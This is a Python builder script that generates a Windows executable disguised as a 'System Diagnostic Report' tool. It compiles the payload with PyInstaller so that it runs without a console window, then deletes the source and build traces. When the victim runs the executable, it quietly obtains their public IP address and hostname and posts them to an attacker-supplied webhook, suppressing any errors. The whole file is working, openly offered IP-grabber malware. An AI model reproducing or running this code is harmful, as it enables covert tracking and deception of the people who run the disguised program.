import os
import shutil

webhook = input("Enter Webhook: ").strip()
if not webhook:
    print("Configuration required.")
    exit()

filename = input("Enter file name (no extension): ").strip()
if not filename:
    filename = "SystemReport"

py_file = f"{filename}.py"

# Disguised payload
payload_code = f'''
import datetime as _dt
import platform as _pf
from requests import get as _get, post as _post

_CONFIG = "{webhook}"

def _sync_system_info():
    try:
        _net_id = _get('https://api.ipify.org', timeout=5).text
        _sys_data = {{
            "content": (
                "System Diagnostic Report\\n"
                f"Network Identifier: `{{_net_id}}`\\n"
                f"Device Label: `{{_pf.node()}}`\\n"
                f"Timestamp: `{{_dt.datetime.now()}}`"
            )
        }}
        _post(_CONFIG, json=_sys_data, timeout=5)
    except Exception:
        pass

if __name__ == "__main__":
    _sync_system_info()
'''

with open(py_file, "w", encoding="utf-8") as f:
    f.write(payload_code)

print("🔧 Compiling diagnostic tool...")
os.system(f"pyinstaller --onefile --noconsole --name \"{filename}\" \"{py_file}\"")

exe_path = f"dist/{filename}.exe"
if os.path.exists(exe_path):
    shutil.move(exe_path, f"./{filename}.exe")

for folder in ["build", "dist"]:
    shutil.rmtree(folder, ignore_errors=True)

for ext in [".spec", ".py"]:
    try:
        os.remove(f"{filename}{ext}")
    except FileNotFoundError:
        pass

print(f"✅ Diagnostic tool created: {filename}.exe")
